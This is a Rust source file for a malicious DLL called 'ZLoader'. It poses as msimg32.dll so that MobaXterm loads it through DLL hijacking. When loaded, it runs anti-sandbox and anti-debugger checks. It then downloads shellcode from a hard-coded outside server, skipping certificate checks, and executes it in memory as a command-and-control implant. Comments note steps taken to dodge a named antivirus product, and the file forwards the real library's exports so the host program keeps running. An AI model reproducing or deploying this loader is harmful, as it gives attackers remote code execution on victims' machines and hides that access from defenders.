// ============================================================
// ZLOADER - DLL Hijacking for MobaXterm (x86)
// Target: MobaXterm Home Edition <= 26.1 (CVE-2026-6421)
// Architecture: x86 (32-bit)
// Persistence: NONE - Relies on user manually starting MobaXterm
// Shellcode URL: https://app.zhuyan.cloud/v5/dl/cmd/c3.bin
// ============================================================

use std::ptr::null_mut;
use std::io::Write;
use std::time::SystemTime;
use winapi::ctypes::c_void;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};

use encoding_rs::GBK;

// ============================================================
// Windows API imports
// ============================================================

#[link(name = "kernel32")]
extern "system" {
    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut c_void;
    fn GetProcAddress(hModule: *mut c_void, lpProcName: *const u8) -> *mut c_void;
    fn OutputDebugStringA(lpOutputString: *const u8);
    fn GetModuleFileNameW(hModule: *mut c_void, lpFilename: *mut u16, nSize: u32) -> u32;
    fn Sleep(milliseconds: u32);
    fn GetTickCount() -> u32;
    fn IsDebuggerPresent() -> i32;
    fn GetSystemTimeAsFileTime(lpSystemTimeAsFileTime: *mut u64);
    fn GetCurrentProcessId() -> u32;
}

#[link(name = "user32")]
extern "system" {
    fn GetForegroundWindow() -> *mut c_void;
    fn GetWindowTextA(hWnd: *mut c_void, lpString: *mut u8, nMaxCount: i32) -> i32;
    fn GetAsyncKeyState(vKey: i32) -> i16;
}

// ============================================================
// Helper Functions
// ============================================================

fn decode_gbk(bytes: &[u8]) -> String {
    let (decoded, _, _) = GBK.decode(bytes);
    decoded.into_owned()
}

fn get_exe_path() -> String {
    unsafe {
        let mut buffer = [0u16; 260];
        let len = GetModuleFileNameW(null_mut(), buffer.as_mut_ptr(), buffer.len() as u32);
        if len > 0 {
            return String::from_utf16_lossy(&buffer[..len as usize]);
        }
        String::new()
    }
}

fn get_exe_dir() -> String {
    let path = get_exe_path();
    if let Some(pos) = path.rfind('\\') {
        return path[..pos].to_string();
    }
    ".".to_string()
}

fn get_log_path() -> String {
    let dir = get_exe_dir();
    format!("{}\\ZLoader.log", dir)
}

fn write_log(msg: &str) {
    let log_path = get_log_path();

    unsafe {
        let debug_msg = format!("[ZLoader] {}\n", msg);
        let cstr = std::ffi::CString::new(debug_msg).unwrap_or_default();
        OutputDebugStringA(cstr.as_ptr() as *const u8);
    }

    let timestamp = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let entry = format!("[{}] {}\n", timestamp, msg);

    let _ = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
        .and_then(|mut f| f.write_all(entry.as_bytes()));
}

// ============================================================
// Anti-Sandbox Detection
// ============================================================

fn is_sandbox() -> bool {
    unsafe {
        if IsDebuggerPresent() != 0 {
            write_log("DEBUGGER detected!");
            return true;
        }
        let start = GetTickCount();
        Sleep(5000);
        let elapsed = GetTickCount() - start;
        if elapsed < 4500 {
            write_log(&format!("TIME ACCELERATION detected: {}ms", elapsed));
            return true;
        }
        let hwnd = GetForegroundWindow();
        if !hwnd.is_null() {
            let mut buffer = [0u8; 256];
            GetWindowTextA(hwnd, buffer.as_mut_ptr(), 255);
            let title = String::from_utf8_lossy(&buffer).to_lowercase();
            let keywords = [
                "sandbox", "virtual", "vmware", "vbox", "qemu",
                "cuckoo", "malware", "analyze", "sample", "virus",
                "threat", "sandboxie", "virtualbox", "vms"
            ];
            for kw in keywords {
                if title.contains(kw) {
                    write_log(&format!("SANDBOX WINDOW: {}", title));
                    return true;
                }
            }
        }
        let mut mouse_moved = false;
        for _ in 0..10 {
            let pos1 = GetAsyncKeyState(0x01);
            Sleep(50);
            let pos2 = GetAsyncKeyState(0x01);
            if pos1 != pos2 {
                mouse_moved = true;
                break;
            }
        }
        if !mouse_moved && GetTickCount() < 30000 {
            write_log("NO MOUSE INTERACTION");
            return true;
        }
        let mut uptime: u64 = 0;
        GetSystemTimeAsFileTime(&mut uptime);
        let uptime_seconds = (uptime / 10000000) % 86400;
        if uptime_seconds < 300 {
            write_log(&format!("SHORT UPTIME: {}s", uptime_seconds));
            return true;
        }
        if let Ok(var) = std::env::var("COMPUTERNAME") {
            let name = var.to_lowercase();
            let vm_keywords = ["vm-", "vbox-", "qemu", "sandbox", "test", "win7", "win10"];
            for kw in vm_keywords {
                if name.contains(kw) {
                    write_log(&format!("VM HOSTNAME: {}", name));
                    return true;
                }
            }
        }
        let sandbox_paths = [
            "C:\\sandbox", "C:\\cuckoo", "C:\\analysis",
            "C:\\malware", "C:\\Users\\admin\\Desktop\\analysis",
        ];
        for path in sandbox_paths {
            if std::path::Path::new(path).exists() {
                write_log(&format!("SANDBOX PATH: {}", path));
                return true;
            }
        }
        write_log("No sandbox detected");
        false
    }
}

// ============================================================
// Download shellcode (C2)
// ============================================================

fn download_shellcode(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .build()?;

    let response = client.get(url).send()?;
    if !response.status().is_success() {
        return Err(format!("HTTP error: {}", response.status()).into());
    }
    let bytes = response.bytes()?;
    Ok(bytes.to_vec())
}

// ============================================================
// DLL Entry Point (NO PERSISTENCE)
// ============================================================

#[no_mangle]
pub extern "system" fn DllMain(
    _hinst_dll: *mut c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut c_void,
) -> bool {
    match fdw_reason {
        1 => {
            let exe_dir = get_exe_dir();
            let exe_path = get_exe_path();
            let log_path = get_log_path();

            write_log("========================================");
            write_log("DLL_PROCESS_ATTACH - ZLoader Loaded (x86)");
            write_log(&format!("Process ID: {}", unsafe { GetCurrentProcessId() }));
            write_log(&format!("EXE Directory: {}", exe_dir));
            write_log(&format!("EXE Full Path: {}", exe_path));
            write_log(&format!("Log File: {}", log_path));

            let sandbox = is_sandbox();

            if sandbox {
                write_log("SANDBOX ENVIRONMENT DETECTED - Delaying execution for 60 seconds");
                unsafe { Sleep(60000); }
            } else {
                write_log("NORMAL ENVIRONMENT - Executing immediately");
            }

            // ONLY create payload thread for C2
            // NO persistence installed to avoid 360 detection
            unsafe {
                let thread_func: unsafe extern "system" fn(*mut c_void) -> u32 = payload_thread;
                let thread_handle = CreateThread(
                    null_mut(),
                    0,
                    Some(thread_func),
                    null_mut(),
                    0,
                    null_mut(),
                );

                if thread_handle.is_null() {
                    write_log("ERROR: Failed to create payload thread");
                } else {
                    write_log("SUCCESS: Payload thread created");
                    write_log("NO PERSISTENCE installed (360 detection avoidance)");
                }
            }
            true
        }
        _ => true,
    }
}

// ============================================================
// Payload Execution Thread (C2)
// ============================================================

unsafe extern "system" fn payload_thread(_param: *mut c_void) -> u32 {
    write_log("========================================");
    write_log("PAYLOAD THREAD STARTED - C2 Connection in progress");
    write_log("========================================");

    let shellcode_url = "https://app.zhuyan.cloud/v5/dl/cmd/c3.bin";
    write_log(&format!("Downloading shellcode from: {}", shellcode_url));

    let shellcode_bytes = match download_shellcode(shellcode_url) {
        Ok(data) => {
            write_log(&format!("Download SUCCESS - Size: {} bytes", data.len()));
            data
        }
        Err(e) => {
            write_log(&format!("Download FAILED: {}", e));
            return 1;
        }
    };

    if shellcode_bytes.is_empty() {
        write_log("ERROR: Shellcode is empty");
        return 1;
    }

    write_log(&format!("First 16 bytes: {:02x?}", &shellcode_bytes[..std::cmp::min(16, shellcode_bytes.len())]));

    write_log(&format!("Allocating {} bytes of memory", shellcode_bytes.len()));
    let exec_mem = VirtualAlloc(
        null_mut(),
        shellcode_bytes.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if exec_mem.is_null() {
        write_log("ERROR: VirtualAlloc failed");
        return 1;
    }
    write_log(&format!("Memory allocated at: {:p}", exec_mem));

    std::ptr::copy(
        shellcode_bytes.as_ptr(),
        exec_mem as *mut u8,
        shellcode_bytes.len(),
    );
    write_log("Shellcode copied to allocated memory");

    let mut old_protect = 0;
    let protect_result = VirtualProtect(
        exec_mem,
        shellcode_bytes.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );

    if protect_result == 0 {
        write_log("ERROR: VirtualProtect failed");
        return 1;
    }
    write_log("Memory protection changed to PAGE_EXECUTE_READWRITE");

    write_log("Executing shellcode - C2 connecting...");
    let shellcode_func: unsafe extern "system" fn(*mut c_void) -> u32 =
        std::mem::transmute(exec_mem);

    let thread_handle = CreateThread(
        null_mut(),
        0,
        Some(shellcode_func),
        null_mut(),
        0,
        null_mut(),
    );

    if !thread_handle.is_null() {
        write_log("Shellcode thread created - C2 online");
        WaitForSingleObject(thread_handle, INFINITE);
        write_log("Shellcode thread finished execution");
    } else {
        write_log("ERROR: Failed to create shellcode execution thread");
        return 1;
    }

    write_log("PAYLOAD THREAD COMPLETED SUCCESSFULLY");
    write_log("========================================");
    0
}

// ============================================================
// Export Forwarding
// ============================================================

unsafe fn get_system_func(name: &str) -> *mut c_void {
    let module_name = b"msimg32.dll\0".as_ptr() as *const u8;
    let module = GetModuleHandleA(module_name);
    if module.is_null() {
        return null_mut();
    }
    let func_name = name.as_bytes();
    let mut name_with_null = func_name.to_vec();
    name_with_null.push(0);
    GetProcAddress(module, name_with_null.as_ptr() as *const u8)
}

#[no_mangle]
pub extern "system" fn vSetDdrawflag() {
    unsafe {
        let func = get_system_func("vSetDdrawflag");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetPreferredMode() {
    unsafe {
        let func = get_system_func("vSetPreferredMode");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw2() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw2");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw4() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw4");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw8() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw8");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw16() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw16");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw24() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw24");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw32() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw32");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn AlphaBlend() {
    unsafe {
        let func = get_system_func("AlphaBlend");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn TransparentBlt() {
    unsafe {
        let func = get_system_func("TransparentBlt");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn DllInitialize() {
    unsafe {
        let func = get_system_func("DllInitialize");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn DllUnload() {
    unsafe {
        let func = get_system_func("DllUnload");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}